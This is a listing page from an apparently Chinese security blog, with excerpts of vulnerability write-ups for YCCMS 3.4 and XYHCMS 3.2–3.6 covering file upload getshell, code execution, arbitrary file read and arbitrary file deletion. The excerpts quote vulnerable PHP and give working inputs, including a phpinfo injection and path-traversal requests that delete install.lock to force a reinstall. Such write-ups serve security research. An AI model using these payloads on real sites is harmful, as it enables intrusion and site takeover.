<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/19/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-YCCMS/YCCMS 3.4 任意文件上传漏洞（一）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time datetime="2022-07-08T06:26:08.348Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="YCCMS-3-4-任意文件上传漏洞（一）"><a href="#YCCMS-3-4-任意文件上传漏洞（一）" class="headerlink" title="YCCMS 3.4 任意文件上传漏洞（一）"></a>YCCMS 3.4 任意文件上传漏洞（一）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YCCMS 3.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在不需要登录的情况上传成功<img src="/resource/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E4%B8%80)/media/rId24.png" alt="5.png">定位到漏洞位置： controller\CallAction.class.php</p>
<pre><code>public function upLoad() &#123;
        if (isset($_POST[&#39;send&#39;])) &#123;
            $_logoupload = new LogoUpload(&#39;pic&#39;,$_POST[&#39;MAX_FILE_SIZE&#39;]);
            $_path = $_logoupload-&gt;getPath();
            $_img = new Image($_path);
            $_img-&gt;xhImg(960,0);
            $_img-&gt;out();
            //echo $_path;
            $_logoupload-&gt;alertOpenerClose(&#39;图片上传成功！&#39;,&#39;..&#39;.$_path);
        &#125; else &#123;
            exit(&#39;警告：文件过大或者其他未知错误导致浏览器崩溃！&#39;);
        &#125;
    &#125;
</code></pre>
<p>然后跟进到类LogoUpload<br>,位于public\class\LogoUpload.class.php，上传首要关注上传是是否允许上传非图片格式的文件</p>
<pre><code>private function checkType() &#123;
        if (!in_array($this-&gt;type,$this-&gt;typeArr)) &#123;
            Tool::alertBack(&#39;警告：LOGO图片必须是PNG格式！&#39;);
        &#125;
    &#125;

private $typeArr = array(&#39;image/png&#39;,&#39;image/x-png&#39;);//类型合集
</code></pre>
<p>根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了<img src="/resource/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E4%B8%80)/media/rId25.png" alt="6.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/YCCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="cl5c2qyw000n8y8v129pg4yan" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-XYHCMS/XYHCMS 3.6 后台文件上传getshell（二）仅限Windows" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BB%85%E9%99%90Windows/" class="article-date">
  <time datetime="2022-07-08T06:26:08.286Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XYHCMS-3-6-后台文件上传getshell（二）仅限Windows"><a href="#XYHCMS-3-6-后台文件上传getshell（二）仅限Windows" class="headerlink" title="XYHCMS 3.6 后台文件上传getshell（二）仅限Windows"></a>XYHCMS 3.6 后台文件上传getshell（二）仅限Windows</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>windows系统特性，windows会将 <code>::$DATA</code>忽略</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>XYHCMS 3.6</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>/App/Manage/Controller/SystemController.class.php</code></p>
<pre><code>if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;
                $data[&#39;CFG_UPLOAD_FILE_EXT&#39;] = strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);
                $_file_exts = explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);
                $_no_exts = array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);
                foreach ($_file_exts as $ext) &#123;
                    if (in_array($ext, $_no_exts)) &#123;
                        $this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);
                    &#125;
                &#125;
            &#125;
</code></pre>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
        
          <p class="article-more-link">
            <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BB%85%E9%99%90Windows/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BB%85%E9%99%90Windows/" data-id="cl5c2qyvd00n7y8v1fn46hj1i" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-XYHCMS/XYHCMS 3.6 后台文件上传getshell（一）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time datetime="2022-07-08T06:26:08.284Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XYHCMS-3-6-后台文件上传getshell（一）"><a href="#XYHCMS-3-6-后台文件上传getshell（一）" class="headerlink" title="XYHCMS 3.6 后台文件上传getshell（一）"></a>XYHCMS 3.6 后台文件上传getshell（一）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>对后缀过滤不严，未过滤php3-5，phtml（老版本直接未过滤php）</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>XYHCMS 3.6</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>/App/Manage/Controller/SystemController.class.php</code> Line 246-255</p>
<pre><code>if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;
                $data[&#39;CFG_UPLOAD_FILE_EXT&#39;] = strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);
                $_file_exts = explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);
                $_no_exts = array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);
                foreach ($_file_exts as $ext) &#123;
                    if (in_array($ext, $_no_exts)) &#123;
                        $this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);
                    &#125;
                &#125;
            &#125;
</code></pre>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
        
          <p class="article-more-link">
            <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%EF%BC%88%E4%B8%80%EF%BC%89/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="cl5c2qyvc00n6y8v12ypo6phs" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-XYHCMS/XYHCMS 3.6 后台代码执行漏洞（二）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date">
  <time datetime="2022-07-08T06:26:08.282Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XYHCMS-3-6-后台代码执行漏洞（二）"><a href="#XYHCMS-3-6-后台代码执行漏洞（二）" class="headerlink" title="XYHCMS 3.6 后台代码执行漏洞（二）"></a>XYHCMS 3.6 后台代码执行漏洞（二）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>XYHCMS 3.6</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>/App/Manage/Controller/SystemController.class.php</code></p>
<pre><code>public function site() &#123;
        if (IS_POST) &#123;
            $data = I(&#39;config&#39;, array(), &#39;trim&#39;);
            //&lt;script\s+language[\s=]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\/script&gt;
            $preg_param = &#39;/&lt;script\s+language[\s=]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;/is&#39;;
            foreach ($data as $key =&gt; $val) &#123;
                if (stripos($val, &#39;&lt;?php&#39;) !== false) &#123;
                    $data[$key] = preg_replace(&#39;/&lt;\?php(.+?)\?&gt;/i&#39;, &#39;&#39;, $val);
                &#125;
————————————————————————————————————————————————————————————————————————————
                if (stripos($val, &#39;&lt;script&#39;) !== false &amp;&amp; stripos($val, &#39;php&#39;) !== false) &#123;
                    $data[$key] = preg_replace(&#39;/&lt;script\s+language[\s=]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\/script&gt;/i&#39;, &#39;&#39;, $val);
                &#125;
                if (stripos($data[$key], &#39;&lt;?php&#39;) !== false || preg_match($preg_param, $data[$key])) &#123;
                    $this-&gt;error(&#39;禁止输入php代码&#39;);
                &#125;
            &#125;
            ————————————————————————————————————————————————————————————————————————————
</code></pre>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
<li><p> 进入后台</p>
</li>
<li><p>系统设置-&gt;网站设置-&gt;会员配置-&gt;禁止使用的名称    <img src="/resource/XYHCMS3.6%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/media/rId26.png" alt="1.png">{width=”5.833333333333333in”<br> height=”2.553546587926509in”}</p>
</li>
</ol>
        
          <p class="article-more-link">
            <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="cl5c2qyvb00n5y8v16z7364il" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-XYHCMS/XYHCMS 3.6 后台代码执行漏洞（三）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%89%EF%BC%89/" class="article-date">
  <time datetime="2022-07-08T06:26:08.280Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XYHCMS-3-6-后台代码执行漏洞（三）"><a href="#XYHCMS-3-6-后台代码执行漏洞（三）" class="headerlink" title="XYHCMS 3.6 后台代码执行漏洞（三）"></a>XYHCMS 3.6 后台代码执行漏洞（三）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>XYHCMS 3.6</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>&lt;?=phpinfo();?&gt;
</code></pre>
<p><img src="/resource/XYHCMS3.6%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E4%B8%89)/media/rId24.png" alt="1.png"></p>
<p><img src="/resource/XYHCMS3.6%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E4%B8%89)/media/rId25.png" alt="2.png"></p>

        
          <p class="article-more-link">
            <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%89%EF%BC%89/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%89%EF%BC%89/" data-id="cl5c2qyuq00n4y8v17soq4iqd" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-XYHCMS/XYHCMS 3.6 后台代码执行漏洞（一）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time datetime="2022-07-08T06:26:08.277Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XYHCMS-3-6-后台代码执行漏洞（一）"><a href="#XYHCMS-3-6-后台代码执行漏洞（一）" class="headerlink" title="XYHCMS 3.6 后台代码执行漏洞（一）"></a>XYHCMS 3.6 后台代码执行漏洞（一）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>（CNVD-2020-03899）<br>XYHCMS后台存在代码执行漏洞，攻击者可利用该漏洞在site.php中增加恶意代码，从而可以获取目标终端的权限。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>XYHCMS 3.6</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>搜索site.php 打开发现是一堆配置文件,这让我想起了前不久看到的一个漏洞所以就全局去找写入点</p>
<p><img src="/resource/XYHCMS3.6%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E4%B8%80)/media/rId24.png"></p>
<p><img src="/resource/XYHCMS3.6%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E4%B8%80)/media/rId25.png"></p>
<p>很显然这里是可以写入的,不过却没有这么简单</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/XYHCMS/XYHCMS%203.6%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="cl5c2qyuq00n3y8v1bntw7sz1" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-XYHCMS/XYHCMS 3.5 后台任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/XYHCMS/XYHCMS%203.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
  <time datetime="2022-07-08T06:26:08.275Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XYHCMS-3-5-后台任意文件读取"><a href="#XYHCMS-3-5-后台任意文件读取" class="headerlink" title="XYHCMS 3.5 后台任意文件读取"></a>XYHCMS 3.5 后台任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>XYHCMS 3.5</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞文件位置：<code>/App/Manage/Controller/TempletsController.class.php</code><br>第59-83行：</p>
<pre><code>public function edit() &#123;
        $ftype     = I(&#39;ftype&#39;, 0, &#39;intval&#39;);
        $fname     = I(&#39;fname&#39;, &#39;&#39;, &#39;trim,htmlspecialchars&#39;);
        $file_path = !$ftype ? &#39;./Public/Home/&#39; . C(&#39;CFG_THEMESTYLE&#39;) . &#39;/&#39; : &#39;./Public/Mobile/&#39; . C(&#39;CFG_MOBILE_THEMESTYLE&#39;) . &#39;/&#39;;
        if (IS_POST) &#123;
            if (empty($fname)) &#123;
                $this-&gt;error(&#39;未指定文件名&#39;);
            &#125;
            $_ext     = &#39;.&#39; . pathinfo($fname, PATHINFO_EXTENSION);
            $_cfg_ext = C(&#39;TMPL_TEMPLATE_SUFFIX&#39;);
            if ($_ext != $_cfg_ext) &#123;
                $this-&gt;error(&#39;文件后缀必须为&quot;&#39; . $_cfg_ext . &#39;&quot;&#39;);
            &#125;
            $content  = I(&#39;content&#39;, &#39;&#39;, &#39;&#39;);
            $fname    = ltrim($fname, &#39;./&#39;);
            $truefile = $file_path . $fname;
            if (false !== file_put_contents($truefile, $content)) &#123;
                $this-&gt;success(&#39;保存成功&#39;, U(&#39;index&#39;, array(&#39;ftype&#39; =&gt; $ftype)));
            &#125; else &#123;
                $this-&gt;error(&#39;保存文件失败，请重试&#39;);
            &#125;
            exit();
        &#125;
        $fname = base64_decode($fname);
        if (empty($fname)) &#123;
            $this-&gt;error(&#39;未指定要编辑的文件&#39;);
        &#125;
        $truefile = $file_path . $fname;

        if (!file_exists($truefile)) &#123;
            $this-&gt;error(&#39;文件不存在&#39;);
        &#125;
        $content = file_get_contents($truefile);
        if ($content === false) &#123;
            $this-&gt;error(&#39;读取文件失败&#39;);
        &#125;
        $content = htmlspecialchars($content);

        $this-&gt;assign(&#39;ftype&#39;, $ftype);
        $this-&gt;assign(&#39;fname&#39;, $fname);
        $this-&gt;assign(&#39;content&#39;, $content);
        $this-&gt;assign(&#39;type&#39;, &#39;修改模板&#39;);
        $this-&gt;display();
    &#125;
</code></pre>
<p>这段函数中对提交的参数进行处理，然后判断是否POST数据上来，如果有就进行保存等，如果没有POST数据，将跳过这段代码继续向下执行。</p>
<p>我们可以通过GET传入fname，跳过前面的保存文件过程，进入文件读取状态。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/XYHCMS/XYHCMS%203.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/XYHCMS/XYHCMS%203.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qyuq00n2y8v1h6f1fn58" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-XYHCMS/XYHCMS 3.2 后台任意文件删除漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/XYHCMS/XYHCMS%203.2%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:08.273Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XYHCMS-3-2-后台任意文件删除漏洞"><a href="#XYHCMS-3-2-后台任意文件删除漏洞" class="headerlink" title="XYHCMS 3.2 后台任意文件删除漏洞"></a>XYHCMS 3.2 后台任意文件删除漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>XYHCMS 3.2</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>/App/Manage/Controller/DatabaseController.class.php</code></p>
<pre><code>//删除sql文件
public function delSqlFiles() &#123;
  
    $id = I(&#39;id&#39;, 0, &#39;intval&#39;);
    $batchFlag = I(&#39;get.batchFlag&#39;, 0, &#39;intval&#39;);
    //批量删除
    if ($batchFlag) &#123;
        $files = I(&#39;key&#39;, array());
    &#125; else &#123;
        $files[] = I(&#39;sqlfilename&#39;, &#39;&#39;);
    &#125;
  
    if (empty($files)) &#123;
        $this-&gt;error(&#39;请选择要删除的sql文件&#39;);
    &#125;
    foreach ($files as $file) &#123;
        $_ext = pathinfo($file, PATHINFO_EXTENSION);
        //拼接后直接删除
  
    foreach ($files as $file) &#123;
        unlink($this-&gt;getDbPath() . &#39;/&#39; . $file);
    &#125;
    $this-&gt;success(&quot;已删除：&quot; . implode(&quot;,&quot;, $files), U(&#39;Database/restore&#39;));
  
&#125;
</code></pre>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
<li><p> 登录后台</p>
</li>
<li><p>删除安装锁文件</p>
<p> a.  get方式</p>
<ul>
<li>  <code>http://www.0-sec.org/xyhai.php? s=/Database/delSqlFiles/sqlfilename/..\\..\\..\\install/install.lock</code></li>
</ul>
<p> b.  post方式</p>
<ul>
<li><p><code>http://www.0-sec.org/xyhai.php?s=/Database/delSqlFiles/batchFlag/1</code></p>
<p>  POST数据：<code>key[]=../../../install/install.lock</code></p>
</li>
</ul>
</li>
<li><p> 之后访问 <code>http://www.0-sec.org/install</code>重装cms</p>
</li>
</ol>
        
          <p class="article-more-link">
            <a href="/2022/07/07/XYHCMS/XYHCMS%203.2%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/XYHCMS/XYHCMS%203.2%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qyup00n1y8v1eqrh6vef" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-XYHCMS/XYHCMS 3.2 后台任意文件下载" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/XYHCMS/XYHCMS%203.2%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="article-date">
  <time datetime="2022-07-08T06:26:08.270Z" itemprop="datePublished">2022-07-07</time>
</a>
    
